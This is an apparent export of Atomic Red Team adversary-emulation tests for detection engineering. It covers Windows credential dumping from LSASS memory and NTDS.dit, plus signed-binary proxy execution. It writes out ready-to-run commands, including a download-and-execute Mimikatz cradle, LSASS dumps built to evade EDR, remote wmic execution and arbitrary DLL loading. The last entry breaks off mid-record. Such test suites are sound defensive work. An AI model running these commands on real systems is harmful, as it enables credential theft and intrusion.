T1003.001,OS Credential Dumping: LSASS Memory,Powershell Mimikatz,66fb0bc1-3c3f-47e9-a298-550ecfefacbc,"Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
Common failures include seeing an \""access denied\"" error which results when Anti-Virus blocks execution. 
Or, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen ""ERROR kuhl_m_sekurlsa_acquireLSA""
",windows,,,"IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
",powershell,True,,,,,"input_arguments.remote_script.description: URL to a remote Mimikatz script that dumps credentials

input_arguments.remote_script.type: url

input_arguments.remote_script.default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1

"
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS with createdump.exe from .Net v5,9d0072c8-7cca-45c4-bd14-f852cfa35cf0,"Use createdump executable from .NET to create an LSASS dump.

[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)
",windows,,,"$exePath =  resolve-path ""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe""
& ""$exePath"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
",powershell,True,,"Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
",powershell,"dependencies.0.description: .Net v5 must be installed

dependencies.0.prereq_command: $exePath =  resolve-path ""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe""
if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent

",
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe using imported Microsoft DLLs,86fc3f40-237f-4701-b155-81c01c48d697,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by
importing built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump 
file and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.

Upon successful execution, you should see the following file created $env:TEMP\lsass-xordump.t1003.001.dmp.
",windows,,,"#{xordump_exe} -out #{output_file} -x 0x41
",powershell,True,,"Remove-Item #{output_file} -ErrorAction Ignore
",,"dependencies.0.description: Computer must have xordump.exe

dependencies.0.prereq_command: if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile #{xordump_exe}

","input_arguments.xordump_exe.description: Path to xordump

input_arguments.xordump_exe.type: path

input_arguments.xordump_exe.default: C:\Windows\Temp\xordump.exe

input_arguments.output_file.description: Path where resulting dump should be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp

"
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe using lolbin rdrleakdiag.exe,47a539d1-61b9-4364-bf49-a68bc2a95ef0,"The memory of lsass.exe is often dumped for offline credential theft attacks. 
This can be achieved with lolbin rdrleakdiag.exe. 

Upon successful execution, you should see the following files created, $env:TEMP\minidump_<PID>.dmp and  $env:TEMP\results_<PID>.hlk.
",windows,,,"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe""
  } elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe""
  } else {
      $binary_path = ""File not found""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""
",powershell,True,,"Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
",,,
T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory through Silent Process Exit,eb5adf16-b601-4926-bca7-dad22adffb37,"WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a 
memory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism 
introduced in Windows 7 called Silent Process Exit, which provides the ability to trigger
specific actions for a monitored process in one of two scenarios; either the process terminates
itself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. 
The major advantage of this technique is that it does not cause lsass.exe to crash, and since 
WerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides 
the added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, 
from an attacker standpoint this is appealing as their illicit credential extraction will 
appear benign because from a defender’s viewpoint it’s within the realm of normal activity.

Upon successful execution, you should find the dump file in directory of your choice or ""%temp%\SilentProcessExit"" by default.
",windows,,,"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""#{output_folder}""
",command_prompt,True,,"rmdir ""#{output_folder}"" /s /q >nul 2> nul
",powershell,"dependencies.0.description: NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)

dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe""

","input_arguments.output_folder.description: Folder Path where resulting dump should be placed

input_arguments.output_folder.type: path

input_arguments.output_folder.default: %temp%\SilentProcessExit

"
T1218,Signed Binary Proxy Execution,mavinject - Inject DLL into running process,c426dacf-575d-4937-8611-a148a86a5e61,"Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.
",windows,,,"mavinject.exe #{process_id} /INJECTRUNNING ""#{dll_payload}""
",command_prompt,True,,,powershell,"dependencies.0.description: T1218.dll must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll"" -OutFile ""#{dll_payload}""

","input_arguments.process_id.description: PID of process receiving injection

input_arguments.process_id.type: string

input_arguments.process_id.default: 1000

input_arguments.dll_payload.description: DLL to inject

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1218\src\x64\T1218.dll

"
T1218,Signed Binary Proxy Execution,Register-CimProvider - Execute evil dll,ad2c17ed-f626-4061-b21e-b9804a6f3655,"Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB
",windows,,,"C:\Windows\SysWow64\Register-CimProvider.exe -Path ""#{dll_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: T1218-2.dll must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll"" -OutFile ""#{dll_payload}""

","input_arguments.dll_payload.description: DLL to execute

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll

"
T1218,Signed Binary Proxy Execution,InfDefaultInstall.exe .inf Execution,54ad7d5a-a1b5-472c-b6c4-f8090fb2daef,"Test execution of a .inf using InfDefaultInstall.exe

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
",windows,,,"InfDefaultInstall.exe ""#{inf_to_execute}""
",command_prompt,,,,powershell,"dependencies.0.description: INF file must exist on disk at specified location (#{inf_to_execute})

dependencies.0.prereq_command: if (Test-Path ""#{inf_to_execute}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{inf_to_execute}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf"" -OutFile ""#{inf_to_execute}""

","input_arguments.inf_to_execute.description: Local location of inf file

input_arguments.inf_to_execute.type: string

input_arguments.inf_to_execute.default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf

"
T1218,Signed Binary Proxy Execution,ProtocolHandler.exe Downloaded a Suspicious File,db020456-125b-4c8b-a4a7-487df8afb5a2,"Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.
",windows,,,"FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b
call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|#{remote_url}""
",command_prompt,False,,,powershell,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  $wdApp = New-Object -COMObject ""Word.Application""
  Stop-Process -Name ""winword""
  exit 0 } catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

","input_arguments.remote_url.description: url to document

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx

"
T1218,Signed Binary Proxy Execution,Microsoft.Workflow.Compiler.exe Payload Execution,7cbb0f26-a4c1-4f77-b180-a009aa05637e,"Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe
",windows,,,"#{mwcpath}\#{mwcname} ""#{xml_payload}"" output.txt
",powershell,False,,,powershell,"dependencies.0.description: .Net must be installed for this test to work correctly.

dependencies.0.prereq_command: if (Test-Path #{mwcpath}\#{mwcname} ) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: write-host "".Net must be installed for this test to work correctly.""

","input_arguments.xml_payload.description: XML to execution

input_arguments.xml_payload.type: path

input_arguments.xml_payload.default: PathToAtomicsFolder\T1218\src\T1218.xml

input_arguments.mwcpath.description: Default location of Microsoft.Workflow.Compiler.exe

input_arguments.mwcpath.type: path

input_arguments.mwcpath.default: C:\Windows\Microsoft.NET\Framework64\v4.0.30319

input_arguments.mwcname.description: Default name of microsoft.workflow.compiler.exe

input_arguments.mwcname.type: path

input_arguments.mwcname.default: microsoft.workflow.compiler.exe

"
T1218,Signed Binary Proxy Execution,Renamed Microsoft.Workflow.Compiler.exe Payload Executions,4cc40fd7-87b8-4b16-b2d7-57534b86b911,"Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe
",windows,,,"&""#{renamed_binary}"" ""#{xml_payload}"" output.txt
",powershell,False,,,powershell,"dependencies.0.description: .Net must be installed for this test to work correctly.

dependencies.0.prereq_command: if (Test-Path ""#{renamed_binary}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Copy-Item #{mwcpath}\#{mwcname} ""#{renamed_binary}"" -Force

","input_arguments.xml_payload.description: XML to execution

input_arguments.xml_payload.type: path

input_arguments.xml_payload.default: PathToAtomicsFolder\T1218\src\T1218.xml

input_arguments.renamed_binary.description: renamed Microsoft.Workflow.Compiler

input_arguments.renamed_binary.type: path

input_arguments.renamed_binary.default: PathToAtomicsFolder\..\ExternalPayloads\svchost.exe

input_arguments.mwcpath.description: Default location of Microsoft.Workflow.Compiler.exe

input_arguments.mwcpath.type: path

input_arguments.mwcpath.default: C:\Windows\Microsoft.NET\Framework64\v4.0.30319

input_arguments.mwcname.description: Default name of microsoft.workflow.compiler.exe

input_arguments.mwcname.type: path

input_arguments.mwcname.default: microsoft.workflow.compiler.exe

"
T1218,Signed Binary Proxy Execution,Invoke-ATHRemoteFXvGPUDisablementCommand base test,9ebe7901-7edf-45c0-b5c7-8366300919db,"RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).

One of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as ""PowerShell module load-order hijacking"" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.

Invoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the ""Disable"" argument to RemoteFXvGPUDisablement.exe.

The Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.

Reference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1
",windows,,,Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.module_name.description: Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used. A PowerShell module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses module load order, a module name must be specified.

input_arguments.module_name.type: string

input_arguments.module_name.default: foo

input_arguments.module_path.description: Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\Documents\WindowsPowerShell\Modules.

input_arguments.module_path.type: string

input_arguments.module_path.default: $PWD

"
T1218,Signed Binary Proxy Execution,DiskShadow Command Execution,0e1483ba-8f0c-425d-b8c6-42736e058eaa,"Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
",windows,,,"#{dspath} -S #{txt_payload} 
",powershell,False,,,powershell,"dependencies.0.description: txt file must exist on disk at specified location (#{txt_payload})
dependencies.0.prereq_command: if (Test-Path ""#{txt_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{txt_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt"" -OutFile ""#{txt_payload}""

dependencies.1.description: DiskShadow.exe must exist on disk at specified location (#{dspath})
dependencies.1.prereq_command: if (Test-Path #{dspath}) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: echo ""DiskShadow.exe not found on disk at expected location""

","input_arguments.txt_payload.description: txt to execute

input_arguments.txt_payload.type: path

input_arguments.txt_payload.default: PathToAtomicsFolder\T1218\src\T1218.txt

input_arguments.dspath.description: Default location of DiskShadow.exe

input_arguments.dspath.type: path

input_arguments.dspath.default: C:\Windows\System32\diskshadow.exe

"
T1218,Signed Binary Proxy Execution,Load Arbitrary DLL via Wuauclt (Windows Update Client),49fbd548-49e9-4bb7-94a6-3769613912b8,"This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. 
See https://dtm.uk/wuauclt/
",windows,,,"wuauclt.exe /UpdateDeploymentProvider ""#{arbitrary_dll}"" /RunHandlerComServer
",command_prompt,,,taskkill /f /im calculator.exe > nul 2>&1,powershell,"dependencies.0.description: DLL to load must exist on disk as specified location (#{arbitrary_dll})

dependencies.0.prereq_command: if (test-path ""#{arbitrary_dll}""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{arbitrary_dll}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true"" -OutFile ""#{arbitrary_dll}""

","input_arguments.arbitrary_dll.description: Path of DLL to be loaded

input_arguments.arbitrary_dll.type: string

input_arguments.arbitrary_dll.default: PathToAtomicsFolder\T1218\bin\calc.dll

"
T1218,Signed Binary Proxy Execution,Lolbin Gpscript logon option,5bcda9cd-8e85-48fa-861d-b5a85d91d48c,"Executes logon scripts configured in Group Policy.
https://lolbas-project.github.io/lolbas/Binaries/Gpscript/
https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/
",windows,,,"Gpscript /logon
",command_prompt,,,,,,
T1218,Signed Binary Proxy Execution,Lolbin Gpscript startup option,f8da74bb-21b8-4af9-8d84-f2c8e4a220e3,"Executes startup scripts configured in Group Policy
https://lolbas-project.github.io/lolbas/Binaries/Gpscript/
https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/
",windows,,,"Gpscript /startup
",command_prompt,,,,,,
T1218,Signed Binary Proxy Execution,Lolbas ie4uinit.exe use as proxy,13c0804e-615e-43ad-b223-2dfbacd0b0b3,"Executes commands from a specially prepared ie4uinit.inf file.
Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/
",windows,,,"copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
copy ""#{Path_inf}"" %TEMP%\ieuinit.inf
%TEMP%\ie4uinit.exe -BaseSettings
",command_prompt,,,"del %TEMP%\ie4uinit.exe >nul 2>&1
del %TEMP%\ieuinit.inf >nul 2>&1
",powershell,"dependencies.0.description: ieuinit.inf must exist on disk at specified location (#{Path_inf})

dependencies.0.prereq_command: if (Test-Path ""#{Path_inf}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{Path_inf}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf"" -OutFile ""#{Path_inf}""

","input_arguments.Path_inf.description: Path to the cab file

input_arguments.Path_inf.type: path

input_arguments.Path_inf.default: PathToAtomicsFolder\T1218\src\ieuinit.inf

input_arguments.Path_ie4uinit.description: Path to ie4uinit.exe

input_arguments.Path_ie4uinit.type: path

input_arguments.Path_ie4uinit.default: c:\windows\system32\ie4uinit.exe

"
T1218,Signed Binary Proxy Execution,LOLBAS CustomShellHost to Spawn Process,b1eeb683-90bb-4365-bbc2-2689015782fe,"This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\windows\system32\` to `C:\temp\`, renaming `calc.exe` to `explorer.exe`.
Upon execution, customshellhost.exe will spawn calc.exe.
Note this will only work on Windows 10 or 11.
[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)
[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)
",windows,,,"if (-not (Test-Path #{dest_path})) {
New-Item -Path #{dest_path} -ItemType Directory
} else {
Write-Host ""Directory #{dest_path} already exists."" }
Copy-Item -Path ""C:\windows\system32\customshellhost.exe"" -Destination ""#{dest_path}\customshellhost.exe"" -Force
Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""#{dest_path}\explorer.exe"" -Force
#{dest_path}\customshellhost.exe
",powershell,True,,"Remove-Item -Path #{dest_path} -Recurse -Force
",,,"input_arguments.dest_path.description: Directory to copy files into

input_arguments.dest_path.type: path

input_arguments.dest_path.default: C:\test

"
T1218,Signed Binary Proxy Execution,Provlaunch.exe Executes Arbitrary Command via Registry Key,ab76e34f-28bf-441f-a39c-8db4835b89cc,"Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.
- https://twitter.com/0gtweet/status/1674399582162153472
- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
Registry keys are deleted after successful execution.
",windows,,,"reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
c:\windows\system32\provlaunch.exe LOLBin
",command_prompt,,,,,,
T1218,Signed Binary Proxy Execution,LOLBAS Msedge to Spawn Process,e5eedaed-ad42-4c1e-8783-19529738a349,"Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn ""calc.exe"" as a child process of msedge.exe
- https://lolbas-project.github.io/lolbas/Binaries/Msedge/
",windows,,,"$edgePath64 = ""C:\Program Files\Microsoft\Edge\Application\msedge.exe""
if (Test-Path $edgePath64) {
    $edgePath = $edgePath64
} else {
    # Check 32-bit Edge installation path
    $edgePath32 = ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
    if (Test-Path $edgePath32) {
        $edgePath = $edgePath32
    } else {
        exit 1
    }
}
& $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&""
sleep 5
taskkill -f -im msedge.exe
taskkill -f -im calc.exe
taskkill -f -im win32calc.exe
",powershell,,,,,,
T1003.003,OS Credential Dumping: NTDS,Create Volume Shadow Copy with vssadmin,dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f,"This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
",windows,,,"vssadmin.exe create shadow /for=#{drive_letter}
",command_prompt,True,,,,"dependencies.0.description: Target must be a Domain Controller

dependencies.0.prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

dependencies.0.get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller must be done manually

","input_arguments.drive_letter.description: Drive letter to source VSC (including colon)

input_arguments.drive_letter.type: string

input_arguments.drive_letter.default: C:

"
T1003.003,OS Credential Dumping: NTDS,Copy NTDS.dit from Volume Shadow Copy,c6237146-9ea6-4711-85c9-c56d263a6b03,"This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

This test requires steps taken in the test ""Create Volume Shadow Copy with vssadmin"".
A successful test also requires the export of the SYSTEM Registry hive.
This test must be executed on a Windows Domain Controller.
",windows,,,"copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
",command_prompt,True,,"del ""#{extract_path}\ntds.dit""        >nul 2> nul
del ""#{extract_path}\VSC_SYSTEM_HIVE"" >nul 2> nul
del ""#{extract_path}\SYSTEM_HIVE""     >nul 2> nul
",,"dependencies.0.description: Target must be a Domain Controller

dependencies.0.prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

dependencies.0.get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller must be done manually

dependencies.1.description: Volume shadow copy must exist

dependencies.1.prereq_command: if not exist #{vsc_name} (exit /b 1)

dependencies.1.get_prereq_command: echo Run ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'"" to fulfill this requirement

dependencies.2.description: Extract path must exist

dependencies.2.prereq_command: if not exist #{extract_path} (exit /b 1)

dependencies.2.get_prereq_command: mkdir #{extract_path}

","input_arguments.vsc_name.description: Name of Volume Shadow Copy

input_arguments.vsc_name.type: string

input_arguments.vsc_name.default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

input_arguments.extract_path.description: Path for extracted NTDS.dit

input_arguments.extract_path.type: path

input_arguments.extract_path.default: C:\Windows\Temp

"
T1003.003,OS Credential Dumping: NTDS,Dump Active Directory Database with NTDSUtil,2364e33d-ceab-4641-8468-bfb1d7cc2723,"This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
uses the ""IFM"" or ""Install From Media"" backup functionality that allows Active Directory restoration or installation of
subsequent domain controllers without the need of network-based replication.

Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.
",windows,,,"mkdir #{output_folder}
ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q
",command_prompt,True,,"rmdir /q /s #{output_folder} >nul 2>&1
",,"dependencies.0.description: Target must be a Domain Controller

dependencies.0.prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

dependencies.0.get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller must be done manually

","input_arguments.output_folder.description: Path where resulting dump should be placed

input_arguments.output_folder.type: path

input_arguments.output_folder.default: C:\Windows\Temp\ntds_T1003

"
T1003.003,OS Credential Dumping: NTDS,Create Volume Shadow Copy with WMI,224f7de0-8f0a-4a94-b5d8-989b036c86da,"This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
",windows,,,"wmic shadowcopy call create Volume=#{drive_letter}
",command_prompt,True,,,,"dependencies.0.description: Target must be a Domain Controller

dependencies.0.prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

dependencies.0.get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller must be done manually

","input_arguments.drive_letter.description: Drive letter to source VSC (including colon and backslash)

input_arguments.drive_letter.type: string

input_arguments.drive_letter.default: C:\

"
T1003.003,OS Credential Dumping: NTDS,Create Volume Shadow Copy remotely with WMI,d893459f-71f0-484d-9808-ec83b2b64226,"This test is intended to be run from a remote workstation with domain admin context.
The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
",windows,,,"wmic /node:""#{target_host}"" shadowcopy call create Volume=#{drive_letter}
",command_prompt,True,,,,"dependencies.0.description: Target must be a reachable Domain Controller, and current context must be domain admin

dependencies.0.prereq_command: wmic /node:""#{target_host}"" shadowcopy list brief

dependencies.0.get_prereq_command: echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)

","input_arguments.drive_letter.description: Drive letter to source VSC (including colon and backslash)

input_arguments.drive_letter.type: string

input_arguments.drive_letter.default: C:\

input_arguments.target_host.description: IP Address / Hostname you want to target

input_arguments.target_host.type: string

input_arguments.target_host.default: localhost

"
T1003.003,OS Credential Dumping: NTDS,Create Volume Shadow Copy remotely (WMI) with esentutl,21c7bf80-3e8b-40fa-8f9d-f5b194ff2865,"This test is intended to be run from a remote workstation with domain admin context.
The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
",windows,,,"wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}""
",command_prompt,True,,,,"dependencies.0.description: Target must be a reachable Domain Controller, and current context must be domain admin

dependencies.0.prereq_command: wmic /node:""#{target_host}"" shadowcopy list brief

dependencies.0.get_prereq_command: echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)

","input_arguments.source_path.description: File to shadow copy

input_arguments.source_path.type: string

input_arguments.source_path.default: c:\windows\ntds\ntds.dit

input_arguments.target_path.description: Target path of the result file

input_arguments.target_path.type: string

input_arguments.target_path.default: c:\ntds.dit

input_arguments.target_host.description: IP Address / Hostname you want to target

input_arguments.target_host.type: string

input_arguments.target_host.default: localhost

"
T1003.003,OS Credential Dumping: NTDS,Create Volume Shadow Copy with Powershell,542bb97e-da53-436b-8e43-e0a7d31a6c24,"This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
",windows,,,"(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
",powershell,True,,,,,"input_arguments.drive_letter.description: Drive letter to source VSC (including colon)

input_arguments.drive_letter.type: string

input_arguments.drive_letter.default: C:\

"
T1003.003,OS Credential Dumping: NTDS,Create Symlink to Volume Shadow Copy,21748c28-2793-4284-9e07-d6d028b66702,"This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.
",windows,,,"vssadmin.exe create shadow /for=#{drive_letter}
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
